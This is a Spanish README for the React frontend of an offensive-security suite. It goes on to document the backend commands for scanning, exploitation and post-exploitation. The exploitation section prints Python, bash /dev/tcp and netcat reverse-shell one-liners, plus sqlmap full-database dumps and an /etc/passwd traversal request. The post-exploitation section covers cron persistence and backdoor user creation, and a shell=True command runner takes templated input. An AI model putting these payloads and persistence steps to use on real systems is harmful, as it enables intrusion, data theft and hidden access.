# Frontend React - Cybersecurity Suite

## 🚀 Descripción

Interfaz moderna en React + TypeScript para la Cybersecurity Suite. Incluye autenticación JWT, dashboard en tiempo real, y módulos para escaneos, IA y reportes.

## 🛠️ Tecnologías

- **React 18** - Framework principal
- **TypeScript** - Tipado estático
- **Tailwind CSS** - Estilos modernos
- **React Query** - Gestión de estado servidor
- **Axios** - Cliente HTTP
- **Lucide React** - Iconos
- **Framer Motion** - Animaciones

## 📦 Instalación

### Prerrequisitos
- Node.js 18+ y npm
- Backend Flask ejecutándose en `http://localhost:5000`

### Instalación
```bash
# Instalar dependencias
npm install

# Iniciar en modo desarrollo
npm run dev

# Construir para producción
npm run build
```

## 🏗️ Estructura del Proyecto

```
frontend/
├── src/
│   ├── components/     # Componentes reutilizables
│   │   ├── Layout.tsx          # Layout principal
│   │   └── LoadingSpinner.tsx  # Spinner de carga
│   ├── contexts/       # Contextos React
│   │   └── AuthContext.tsx     # Autenticación JWT
│   ├── hooks/          # Custom hooks
│   ├── lib/            # Utilidades
│   ├── pages/          # Páginas principales
│   │   ├── Login.tsx           # Login
│   │   ├── Dashboard.tsx       # Dashboard principal
│   │   ├── Scanning.tsx        # Módulo de escaneos
│   │   ├── IA.tsx              # Módulo de IA
│   │   └── Reporting.tsx       # Generador de reportes
│   ├── types/          # Definiciones TypeScript
│   │   └── index.ts            # Tipos principales
│   ├── utils/          # Utilidades
│   ├── App.tsx         # Componente principal
│   ├── App.css         # Estilos específicos
│   ├── main.tsx        # Punto de entrada
│   └── index.css       # Estilos globales
├── public/             # Archivos estáticos
├── package.json        # Dependencias
├── vite.config.ts      # Configuración Vite
├── tsconfig.json       # Configuración TypeScript
└── tailwind.config.js  # Configuración Tailwind
```

## 🔧 Configuración

### Variables de Entorno
```bash
# .env (opcional)
VITE_API_BASE_URL=http://localhost:5001
```

### Proxy de Desarrollo
El Vite está configurado para proxy las peticiones `/api` al backend Flask:
```typescript
// vite.config.ts
proxy: {
  '/api': {
    target: 'http://localhost:5001',
    changeOrigin: true
  }
}
```

## 🎨 Características

### ✅ COMPLETAMENTE FUNCIONAL
- **Autenticación JWT** completa con backend Flask
- **Layout responsive** con sidebar y navegación
- **Tema cyberpunk** moderno y personalizable
- **Dashboard en tiempo real** con métricas del sistema
- **Módulo de escaneos** completamente integrado
- **Análisis IA** con DeepSeek, Gemini y Ollama
- **Generador de reportes** profesional
- **Componentes reutilizables**: LoadingSpinner, Layout
- **TypeScript** completamente tipado
- **React Query** para gestión de estado servidor
- **Axios con interceptores** JWT automáticos

### 🚀 Características Avanzadas
- **Actualización automática** de datos cada 5-30 segundos
- **Estados de carga** y manejo de errores completo
- **Formularios inteligentes** con validación
- **Historial en tiempo real** de escaneos y reportes
- **Interfaz cyberpunk** con efectos visuales
- **Responsive design** desktop + mobile
- **Gestión de sesiones** y estados persistentes

## 🚀 Uso

### Iniciar la aplicación
```bash
# Backend (en una terminal - puerto 5001)
cd interfaz_web
python3 app_refactored.py

# Frontend (en otra terminal - puerto 5173)
cd frontend
npm run dev
```

### Acceder
- **Frontend:** `http://localhost:5173`
- **Backend API:** `http://localhost:5001`

### Credenciales por defecto
- **Usuario:** admin
- **Contraseña:** CambialaInmediatamente123!

## 📱 Responsive Design

- **Desktop:** Layout completo con sidebar
- **Mobile:** Navegación colapsable, optimizado para touch

## 🎨 Tema

### Cyberpunk (Default)
- Colores: Verde neón (#00ff00), magenta (#ff0080), cyan (#00ffff)
- Fondos oscuros con efectos de glow
- Tipografía monospace (JetBrains Mono)

### Personalizable
Fácil cambio de temas mediante CSS variables.

## 🔧 Desarrollo

### Comandos disponibles
```bash
npm run dev      # Servidor de desarrollo
npm run build    # Build de producción
npm run preview  # Preview del build
npm run lint     # Linting con ESLint
```

### Estructura de commits
```
feat: nueva funcionalidad
fix: corrección de bug
docs: cambios en documentación
style: cambios de estilo
refactor: refactorización
```

## 🤝 Contribución

1. Fork el proyecto
2. Crea una rama (`git checkout -b feature/nueva-funcionalidad`)
3. Commit tus cambios (`git commit -m 'feat: descripción'`)
4. Push a la rama (`git push origin feature/nueva-funcionalidad`)
5. Abre un Pull Request

## 📝 Licencia

Este proyecto es parte de la Cybersecurity Suite - Factor X.

---

## 📋 DOCUMENTACIÓN DE COMANDOS EJECUTADOS

Este documento detalla todos los comandos del sistema que se ejecutan en el backend para cada funcionalidad de la aplicación.

### 1. ESCANEOS DE VULNERABILIDADES (`vulnerability.py`)

#### Nikto Web Scanner
```bash
nikto -h {target} -Format txt -output {output_file}
```
- **Función:** `nikto_scan()`
- **Timeout:** 5 minutos
- **Descripción:** Escanea vulnerabilidades web en el target especificado

#### Nmap Vulnerability Scan
```bash
nmap -sV --script vuln {target} -oN {output_file}
```
- **Función:** `nmap_vuln_scan()`
- **Timeout:** 10 minutos
- **Descripción:** Escaneo de vulnerabilidades con Nmap usando scripts NSE

#### Nuclei Scanner
```bash
nuclei -u {target} -o {output_file} -json
```
- **Función:** `nuclei_scan()`
- **Timeout:** 15 minutos
- **Descripción:** Escaneo con Nuclei para detectar vulnerabilidades conocidas

#### SQLMap
```bash
sqlmap -u "{url}" --batch --dbs -o {output_file}
```
- **Función:** `sqlmap_scan()`
- **Timeout:** 5 minutos
- **Descripción:** Detección y explotación de vulnerabilidades SQL injection

#### Comprehensive Vulnerability Scan
```bash
# Ejecuta múltiples herramientas en secuencia:
nikto -h {target} -Format txt -output {nikto_output}
nmap -sV --script vuln {target} -oN {nmap_output}
nuclei -u {target} -o {nuclei_output} -json
```
- **Función:** `comprehensive_vulnerability_scan()`
- **Timeout:** Variable según herramienta
- **Descripción:** Escaneo completo combinando múltiples herramientas

### 2. EXPLOTACIÓN (`exploitation.py`)

#### RCE (Remote Code Execution)
```bash
# Simulación de RCE - diferentes payloads según configuración:
echo 'Testing rce_exploit on {target}'
# Python reverse shell (si se especifica puerto):
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{target}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
# Bash reverse shell (si se especifica puerto):
bash -i >& /dev/tcp/{target}/{port} 0>&1
# Netcat reverse shell (si se especifica puerto):
nc -e /bin/sh {target} {port}
```
- **Función:** `rce_exploit()`
- **Descripción:** Intenta diferentes métodos de ejecución remota de código

#### SQL Injection Exploit
```bash
sqlmap -u "{url}" --batch --dump-all -o {output_file}
```
- **Función:** `sql_injection_exploit()`
- **Descripción:** Explotación de vulnerabilidades SQL injection para extraer datos

#### Command Injection Exploit
```bash
# Simula command injection con payloads comunes
echo 'Testing command injection on {target}:{port}'
```
- **Función:** `command_injection_exploit()`
- **Descripción:** Pruebas de inyección de comandos en aplicaciones

#### File Inclusion Exploit
```bash
# Simula Local/Remote File Inclusion
curl -s "http://{url}/?page=../../../../etc/passwd"
```
- **Función:** `file_inclusion_exploit()`
- **Descripción:** Pruebas de inclusión de archivos locales/remotos

#### Deserialization Exploit
```bash
# Simula deserialización con payloads Java/PHP
echo 'Testing deserialization exploit on {target}'
```
- **Función:** `deserialization_exploit()`
- **Descripción:** Pruebas de vulnerabilidades de deserialización

#### Buffer Overflow Exploit
```bash
# Simula buffer overflow
echo 'Testing buffer overflow on {target}:{port}'
```
- **Función:** `buffer_overflow_exploit()`
- **Descripción:** Pruebas de desbordamiento de búfer

### 3. RECONOCIMIENTO (`reconnaissance.py`)

#### Nmap Port Scanning
```bash
nmap -sS -p- {target} -oN {output_file}
```
- **Función:** `port_scan()`
- **Descripción:** Escaneo completo de puertos TCP

#### Service Version Detection
```bash
nmap -sV {target} -oN {output_file}
```
- **Función:** `service_scan()`
- **Descripción:** Detección de versiones de servicios

#### OS Fingerprinting
```bash
nmap -O {target} -oN {output_file}
```
- **Función:** `os_detection()`
- **Descripción:** Detección del sistema operativo

### 4. ESCANEOS GENERALES (`scanning.py`)

#### Full Port Scan
```bash
nmap -sS -p- --min-rate 1000 {target} -oN {output_file}
```
- **Timeout:** 20 segundos
- **Descripción:** Escaneo rápido de todos los puertos

#### Service Detection
```bash
nmap -sV --version-intensity 5 {target} -oN {output_file}
```
- **Timeout:** 20 segundos
- **Descripción:** Detección detallada de servicios

#### UDP Scan
```bash
nmap -sU --top-ports 100 {target} -oN {output_file}
```
- **Descripción:** Escaneo de puertos UDP comunes

#### Vulnerability Assessment
```bash
nmap --script vuln {target} -oN {output_file}
```
- **Timeout:** 5 minutos
- **Descripción:** Escaneo de vulnerabilidades con scripts NSE

#### Web Application Scan
```bash
nikto -h {target} -Format txt -output {output_file}
```
- **Timeout:** 5 minutos
- **Descripción:** Escaneo de aplicaciones web

#### Comprehensive Security Audit
```bash
# Combinación de múltiples herramientas:
nmap -sS -p- {target} -oN {ports_output}
nmap -sV {target} -oN {services_output}
nikto -h {target} -output {web_output}
```
- **Timeout:** Variable
- **Descripción:** Auditoría completa de seguridad

### 5. POST-EXPLOTACIÓN (`post_exploitation.py`)

#### Privilege Escalation Check
```bash
# Linux privilege escalation
sudo -l
id
whoami
cat /etc/passwd
```
- **Función:** `privilege_escalation_check()`
- **Descripción:** Verificación de posibles escaladas de privilegios

#### Cron Job Persistence
```bash
# Agregar tarea programada
(crontab -l ; echo "{cron_schedule} {command}") | crontab -
```
- **Función:** `add_cron_job()`
- **Descripción:** Persistencia mediante tareas programadas

#### SSH Key Generation
```bash
ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N ""
```
- **Función:** `generate_ssh_key()`
- **Descripción:** Generación de claves SSH para acceso persistente

#### User Creation
```bash
useradd -m -s /bin/bash {username}
echo "{username}:{password}" | chpasswd
```
- **Función:** `create_user()`
- **Descripción:** Creación de usuarios backdoor

#### File System Enumeration
```bash
find / -type f -name "*.conf" 2>/dev/null | head -20
ls -la /etc/
```
- **Función:** `enumerate_filesystem()`
- **Descripción:** Enumeración del sistema de archivos

#### Network Enumeration
```bash
ip route
arp -a
netstat -tuln
```
- **Función:** `enumerate_network()`
- **Descripción:** Enumeración de configuración de red

#### Process Enumeration
```bash
ps aux
top -b -n 1 | head -20
```
- **Función:** `enumerate_processes()`
- **Descripción:** Enumeración de procesos en ejecución

#### Service Enumeration
```bash
systemctl list-units --type=service --state=active
service --status-all
```
- **Función:** `enumerate_services()`
- **Descripción:** Enumeración de servicios del sistema

### 6. INTEGRACIONES (`integrations.py`)

#### Metasploit Integration
```bash
msfconsole -q -x "use {module}; set RHOSTS {target}; set RPORT {port}; exploit; exit"
```
- **Función:** `metasploit_exploit()`
- **Descripción:** Ejecución de exploits mediante Metasploit Framework

#### Burp Suite Integration
```bash
# Automatización de Burp Suite (simulado)
echo "Burp Suite scan initiated on {target}"
```
- **Función:** `burp_scan()`
- **Descripción:** Integración con Burp Suite para escaneos web

#### Custom Tool Integration
```bash
# Ejecución de herramienta personalizada
{command} {target} {options}
```
- **Función:** `custom_tool_execution()`
- **Descripción:** Ejecución de herramientas personalizadas

### 7. FUNCIONES DEL SISTEMA

#### Command Execution (`utils/__init__.py`)
```python
def run_command(cmd: str, cwd: Optional[str] = None, timeout: int = 300):
    """Ejecuta comandos del sistema de forma segura"""
    result = subprocess.run(
        cmd,
        shell=True,
        cwd=cwd,
        capture_output=True,
        text=True,
        timeout=timeout
    )
    return result.returncode, result.stdout, result.stderr
```

**Características:**
- Timeout configurable (default: 5 minutos)
- Captura de stdout y stderr
- Manejo de errores y timeouts
- Ejecución en directorio específico opcional

### 8. CONFIGURACIÓN DE SEGURIDAD

#### Timeouts por Módulo:
- **Escaneos básicos:** 20-60 segundos
- **Escaneos vulnerabilidades:** 5-15 minutos
- **Explotación:** 5 minutos
- **Reconocimiento:** 2-5 minutos
- **Post-explotación:** 10 segundos - 1 minuto

#### Manejo de Errores:
- Todos los comandos incluyen manejo de excepciones
- Timeouts apropiados para evitar bloqueos
- Logging detallado de errores
- Limpieza automática de sesiones fallidas

#### Consideraciones de Seguridad:
- Validación de inputs antes de ejecutar comandos
- Uso de `shell=True` solo cuando es necesario
- Sanitización de parámetros
- Logging de todas las ejecuciones para auditoría

---

**Nota:** Algunos comandos están marcados como "simulados" porque en un entorno de producción real requerirían configuraciones adicionales de seguridad y podrían no ejecutarse directamente por razones de seguridad.

**Factor X** 🤖 - Frontend React listo para desarrollo
